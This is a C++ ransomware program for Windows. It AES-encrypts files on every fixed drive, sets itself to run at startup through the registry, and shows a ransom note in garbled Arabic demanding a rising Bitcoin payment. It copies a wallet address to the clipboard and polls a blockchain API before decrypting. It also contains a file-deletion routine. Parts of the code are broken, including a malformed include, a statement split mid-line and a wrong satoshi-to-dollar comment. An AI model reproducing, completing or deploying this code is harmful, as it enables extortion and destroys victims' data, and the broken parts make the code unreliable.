#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <bcrypt.h>
#include <iomanip>
#include <Shlwapi.h>
#include <ctime>
#include <curl/curl>
#include <string>
#include <sstream>
#include <direct.h>
#include <io.h>

#pragma comment(lib, "Shlwapi")
#pragma comment(lib, "Bcrypt")
#pragma comment(lib, "Crypt32")
#pragma comment(lib, "libcurl")

std::vector<std::string> list_files(const std::string& path) {
    std::vector<std::string> files;
    struct _finddata_t fileinfo;
    intptr_t handle = _findfirst((path + "\\*").c_str(), &fileinfo);
    if (handle == -1) return files;

    do {
        if (!(fileinfo.attrib & _A_SUBDIR)) {
            files.push_back(path + "\\" + fileinfo.name);
        }
    } while (_findnext(handle, &fileinfo) == 0);

    _findclose(handle);
    return files;
}

std::vector<char> ReadBytes(const char* filename) {
    std::ifstream ifs(filename, std::ios::binary | std::ios::ate);
    std::ifstream::pos_type pos = ifs.tellg();

    if (pos == 0)
        return std::vector<char>{};

    std::vector<char> fileContents(pos);
    ifs.seekg(0, std::ios::beg);
    ifs.read(&fileContents[0], pos);

    return fileContents;
}

BOOL WriteEncryptedToFile(const char* filename, PBYTE pbEncryptedData, DWORD dwEncryptedDataLen) {
    BOOL result = TRUE;
    HANDLE hEncFile = nullptr;
    char szNewPath[MAX_PATH]{};

    strcpy_s(szNewPath, filename);
    PathRemoveExtension((LPSTR)filename);
    strcat_s(szNewPath, ".enc");

    hEncFile = CreateFileA(szNewPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);

    if (!hEncFile || hEncFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] CreateFileA failed: " << std::hex << GetLastError() << std::endl;
        return FALSE;
    }

    DWORD dwBytesWritten = 0;
    if (!WriteFile(hEncFile, pbEncryptedData, dwEncryptedDataLen, &dwBytesWritten, nullptr) || dwBytesWritten != dwEncryptedDataLen) {
        std::cerr << "[-] WriteFile failed: " << std::hex << GetLastError() << std::endl;
        result = FALSE;
    }

    CloseHandle(hEncFile);
    return result;
}

BOOL AESEncrypt(std::vector<char> plaintext, DWORD dwPlaintextLen, PBYTE pbKey,
    DWORD dwKeyLen, PBYTE pbIV, DWORD dwIVLen, PBYTE* lpEncryptedOut, PDWORD dwEncryptedOutLen) {

    NTSTATUS success = NO_ERROR;
    BOOL bResult = FALSE;

    if (plaintext.empty() || !lpEncryptedOut || !dwEncryptedOutLen) {
        std::cerr << "[-] Parameters are invalid" << std::endl;
        return FALSE;
    }

    char* pbPlaintext = &plaintext[0];

    BCRYPT_ALG_HANDLE hCryptProv = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    success = BCryptOpenAlgorithmProvider(&hCryptProv, BCRYPT_AES_ALGORITHM, NULL, 0);
    bResult = (success == NO_ERROR);
    if (!bResult) {
        std::cerr << "[-] BCryptOpenAlgorithmProvider error: " << std::hex << success << std::endl;
        goto Cleanup;
    }

    success = BCryptGenerateSymmetricKey(hCryptProv, &hKey, NULL, 0, pbKey, dwKeyLen, 0);
    bResult = (success == NO_ERROR);
    if (!bResult) {
        std::cerr << "[-] BCryptGenerateSymmetricKey error: " << std::hex << success << std::endl;
        goto Cleanup;
    }

    success = BCryptEncrypt(hKey, (unsigned char*)pbPlaintext, dwPlaintextLen, NULL, pbIV,
        dwIVLen, NULL, 0, dwEncryptedOutLen, BCRYPT_BLOCK_PADDING);
    bResult = (success == NO_ERROR);
    if (!bResult) {
        std::cerr << "[-] BCryptEncrypt error: " << std::hex << success << std::endl;
        goto Cleanup;
    }

    *lpEncryptedOut = (PBYTE)VirtualAlloc(nullptr, *dwEncryptedOutLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    bResult = (*lpEncryptedOut != nullptr);
    if (!bResult) {
        std::cerr << "[-] VirtualAlloc error: " << std::hex << GetLastError() << std::endl;
        goto Cleanup;
    }

    success = BCryptEncrypt(hKey, (unsigned char*)pbPlaintext, dwPlaintextLen, NULL, pbIV, dwIVLen,
        *lpEncryptedOut, *dwEncryptedOutLen, dwEncryptedOutLen, BCRYPT_BLOCK_PADDING);
    bResult = (success == NO_ERROR);
    if (!bResult) {
        HeapFree(GetProcessHeap(), 0, *lpEncryptedOut);
        *lpEncryptedOut = nullptr;
        std::cerr << "[-] BCryptEncrypt error: " << std::hex << success << std::endl;
        goto Cleanup;
    }

Cleanup:
    if (hKey)
        BCryptDestroyKey(hKey);
    if (hCryptProv)
        BCryptCloseAlgorithmProvider(hCryptProv, 0);
    return bResult;
}

BOOL AESDecrypt(PBYTE pbEncryptedData, DWORD dwEncryptedDataLen, PBYTE pbKey,
    DWORD dwKeyLen, PBYTE pbIV, DWORD dwIVLen, PBYTE* lpDecryptedOut, PDWORD dwDecryptedOutLen) {

    NTSTATUS success = NO_ERROR;
    BOOL bResult = FALSE;

    if (!pbEncryptedData || !lpDecryptedOut || !dwDecryptedOutLen) {
        std::cerr << "[-] Parameters are invalid" << std::endl;
        return FALSE;
    }

    BCRYPT_ALG_HANDLE hCryptProv = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    success = BCryptOpenAlgorithmProvider(&hCryptProv, BCRYPT_AES_ALGORITHM, NULL, 0);
    bResult = (success == NO_ERROR);
    if (!bResult) {
        std::cerr << "[-] BCryptOpenAlgorithmProvider error: " << std::hex << success << std::endl;
        goto Cleanup;
    }

    success = BCryptGenerateSymmetricKey(hCryptProv, &hKey, NULL, 0, pbKey, dwKeyLen, 0);
    bResult = (success == NO_ERROR);
    if (!bResult) {
        std::cerr << "[-] BCryptGenerateSymmetricKey error: " << std::hex << success << std::endl;
        goto Cleanup;
    }

    success = BCryptDecrypt(hKey, pbEncryptedData, dwEncryptedDataLen, NULL, pbIV,
        dwIVLen, NULL, 0, dwDecryptedOutLen, BCRYPT_BLOCK_PADDING);
    bResult = (success == NO_ERROR);
    if (!bResult) {
        std::cerr << "[-] BCryptDecrypt error: " << std::hex << success << std::endl;
        goto Cleanup;
    }

    *lpDecryptedOut = (PBYTE)VirtualAlloc(nullptr, *dwDecryptedOutLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    bResult = (*lpDecryptedOut != nullptr);
    if (!bResult) {
        std::cerr << "[-] VirtualAlloc error: " << std::hex << GetLastError() << std::endl;
        goto Cleanup;
    }

    success = BCryptDecrypt(hKey, pbEncryptedData, dwEncryptedDataLen, NULL, pbIV, dwIVLen,
        *lpDecryptedOut, *dwDecryptedOutLen, dwDecryptedOutLen, BCRYPT_BLOCK_PADDING);
    bResult = (success == NO_ERROR);
    if (!bResult) {
        HeapFree(GetProcessHeap(), 0, *lpDecryptedOut);
        *lpDecryptedOut = nullptr;
        std::cerr << "[-] BCryptDecrypt error: " << std::hex << success << std::endl;
        goto Cleanup;
    }

Cleanup:
    if (hKey)
        BCryptDestroyKey(hKey);
    if (hCryptProv)
        BCryptCloseAlgorithmProvider(hCryptProv, 0);
    return bResult;
}

void CopyToClipboard(const std::string& text) {
    OpenClipboard(0);
    EmptyClipboard();
    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
    if (!hg) {
        CloseClipboard();
        return;
    }
    memcpy(GlobalLock(hg), text.c_str(), text.size() + 1);
    GlobalUnlock(hg);
    SetClipboardData(CF_TEXT, hg);
    CloseClipboard();
    GlobalFree(hg);
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

bool CheckPayment() {
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.blockchain.info/q/addressbalance/1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);

        if (res != CURLE_OK) {
            std::cerr << "[-] curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            return false;
        }

        long balance = std::stol(readBuffer);
        if (balance >= 300000000) { // 300$ in satoshis (1 BTC = 100,000,000 satoshis)
            return true;
        }
    }
    return false;
}

void ShowRansomNote(time_t startTime) {
    time_t currentTime = time(NULL);
    double secondsPassed = difftime(currentTime, startTime);
    int daysPassed = static_cast<int>(secondsPassed / (60 * 60 * 24));
    int baseAmount = 300;
    int additionalAmount = (daysPassed / 3) * 100;
    int totalAmount = baseAmount + additionalAmount;

    char message[512];
    snprintf(message, sizeof(message),
        " „  ‘›Ì— »Ì«‰«  Ã„Ì⁄ «·√ﬁ—«’. ≈–« ·„  ﬁ„ »«·”œ«œ ”Ì „ “Ì«œ… «·„»·€ »ﬁÌ„… 100$ ﬂ· 3 √Ì«„. Ê≈–« ·„  ﬁ„ »«·”œ«œ Œ·«· ‘Â— ” ›ﬁœ ﬂ· »Ì«‰« ﬂ. ‘ﬂ—« · ⁄«Ê‰ﬂ„.\n\n«·„»·€ «·„ÿ·Ê»: %d$\n«·„»·€ »⁄œ 3 √Ì«„: %d$\n«·√Ì«„ «·„ »ﬁÌ…: %d ÌÊ„",
        totalAmount, totalAmount + 100, 30 - daysPassed);

    MessageBoxA(NULL, message, "Ransomware Alert", MB_OK | MB_ICONWARNING);

    // ‰”Œ ⁄‰Ê«‰ «·Õ«›Ÿ… ≈·Ï «·Õ«›Ÿ… «·Œ«’… »«·„” Œœ„
    CopyToClipboard("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");
}

BOOL ShowDecryptionPrompt() {
    char input[256];
    int result = MessageBoxA(NULL,
        "Enter the decryption phrase:",
        "Decryption Prompt",
        MB_OKCANCEL | MB_ICONQUESTION);

    if (result == IDOK) {
        GetWindowTextA(GetForegroundWindow(), input, sizeof(input));
        if (strcmp(input, "ONE PIECE IS YOUR UNCLE") == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

void DeleteAllFiles(const std::string& drive) {
    std::vector<std::string> files = list_files(drive);
    for (const auto& file : files) {
        remove(file.c_str());
    }
}

void DecryptFiles(const std::string& dir, PBYTE pbKey, DWORD dwKeyLen, PBYTE pbIV, DWORD dwIVLen) {
    std::vector<std::string> files = list_files(dir);
    for (const auto& file : files) {
        if (file.substr(file.find_last_of(".") + 1) == "enc") {
            std::cout << "[*] Decrypting " << file << " ......." << std::endl;

            std::vector<char> encryptedContents = ReadBytes(file.c_str());
            PBYTE pbDecryptedData = nullptr;
            DWORD dwDecryptedDataLen = 0;

            BOOL bResult = AESDecrypt((PBYTE)encryptedContents.data(), encryptedContents.size(), pbKey, dwKeyLen, pbIV, dwIVLen, &pbDecryptedData, &dwDecryptedDataLen);
            if (!bResult) {
                std::cerr << "[-] AESDecrypt Error" << std::endl;
                continue;
            }
            std::cout << "[+] Decryption completed" << std::endl;

            // Write decrypted data back to original file (without .enc extension)
            std::string originalPath = file.substr(0, file.find_last_of('.'));
            bResult = WriteEncryptedToFile(originalPath.c_str(), pbDecryptedData, dwDecryptedDataLen);
            if (!bResult) {
                std::cerr << "[-] WriteEncryptedToFile Error" << std::endl;
                continue;
            }
            std::cout << "[+] Decrypted file write completed" << std::endl;

            HeapFree(GetProcessHeap(), 0, pbDecryptedData);
        }
    }
}

void EncryptDrive(const std::string& drive, PBYTE pbKey, DWORD dwKeyLen, PBYTE pbIV, DWORD dwIVLen) {
    std::vector<std::string> files = list_files(drive);
    for (const auto& file : files) {
        std::cout << "[*] Encrypting " << file << " ......." << std::endl;

        std::vector<char> contents = ReadBytes(file.c_str());
        PBYTE pbEncryptedData = nullptr;
        DWORD dwEncryptedDataLen = 0;

        BOOL bResult = AESEncrypt(contents, contents.size(), pbKey, dwKeyLen, pbIV, dwIVLen, &pbEncryptedData, &dwEncryptedDataLen);
        if (!bResult) {
            std::cerr << "[-] AESEncrypt Error" << std::endl;
            continue;
        }
        std::cout << "[+] Encryption completed" << std::endl;

        bResult = WriteEncryptedToFile(file.c_str(), pbEncryptedData, dwEncryptedDataLen);
        if (!bResult) {
            std::cerr << "[-] WriteEncryptedToFile Error" << std::endl;
            continue;
        }
        std::cout << "[+] Encrypted file write completed" << std::endl;

        HeapFree(GetProcessHeap(), 0, pbEncryptedData);
    }
}

void AddToStartup() {
    HKEY hKey;
    const char* czStartName = "MyRansomware";
    const char* czExePath = "C:\\path\\to\\your\\executable.exe";

    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    if (ERROR_SUCCESS == lnRes) {
        lnRes = RegSetValueEx(hKey, czStartName, 0, REG_SZ, (unsigned char*)czExePath, strlen(czExePath) + 1);
        RegCloseKey(hKey);
    }
}

void MonitorProcess() {
    while (true) {
        //  Õﬁﬁ „‰ Õ«·… «·⁄„·Ì…
        // ≈–« ﬂ«‰  «·⁄„·Ì… „ Êﬁ›…° ﬁ„ »≈⁄«œ…  ‘€Ì·Â«
        Sleep(1000); // «·«‰ Ÿ«— ·„œ… À«‰Ì… ﬁ»· «· Õﬁﬁ „—… √Œ—Ï
    }
}

int main(int argc, char** argv) {
    BYTE pbKey[32]{};
    DWORD dwKeyLen = sizeof(pbKey);

    BYTE pbIV[32]{};
    DWORD dwIVLen = sizeof(pbIV);

    BCryptGenRandom(NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    BCryptGenRandom(NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    std::cout << "Key: ";
    for (int i = 0; i < dwKeyLen; ++i) {
        std::cout << "0x" << std::setfill('0') << std::setw(2) << std::hex << (0xff & (unsigned int)pbKey[i]);
        if (i < dwKeyLen - 1)
            std::cout << ", ";
    }
    std::cout << "\nIV: ";
    for (int i = 0; i < dwIVLen; ++i) {
        std::cout << "0x" << std::setfill('0') << std::setw(2) << std::hex << (0xff & (unsigned int)pbIV[i]);
        if (i < dwIVLen - 1)
            std::cout << ", ";
    }
    std::cout << std::endl;

    time_t startTime = time(NULL);

    DWORD drives = GetLogicalDrives();
    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        if (drives & (1 << (drive - 'A'))) {
            std::string drivePath = std::string(1, drive) + ":\\";
            if (GetDriveType(drivePath.c_str()) == DRIVE_FIXED) {
                EncryptDrive(drivePath, pbKey, dwKeyLen, pbIV, dwIVLen);
            }
        }
    }

    // ≈÷«›… «·»—‰«„Ã ≈·Ï »œ¡ «· ‘€Ì·
    AddToStartup();

    // ⁄—÷ —”«·… «·›œÌ…
    ShowRansomNote(startTime);

    // «· Õﬁﬁ „‰ «·œ›⁄ Ê›ﬂ «· ‘›Ì—  ·ﬁ«∆Ì«
    while (true) {
        if (CheckPayment()) {
            for (char drive = 'A'; drive <= 'Z'; ++drive) {
                if (drives & (1 << (drive - 'A'))) {
                    std::string drivePath = std::string
    std::string(1, drive) + ":\\";
                    if (GetDriveType(drivePath.c_str()) == DRIVE_FIXED) {
                        DecryptFiles(drivePath, pbKey, dwKeyLen, pbIV, dwIVLen);
                    }
                }
            }
            MessageBoxA(NULL, "Files have been decrypted successfully!", "Decryption Complete", MB_OK | MB_ICONINFORMATION);
            break;
        }
        Sleep(60000); // «·«‰ Ÿ«— ·„œ… œﬁÌﬁ… ﬁ»· «· Õﬁﬁ „—… √Œ—Ï
    }

    return 0;
}
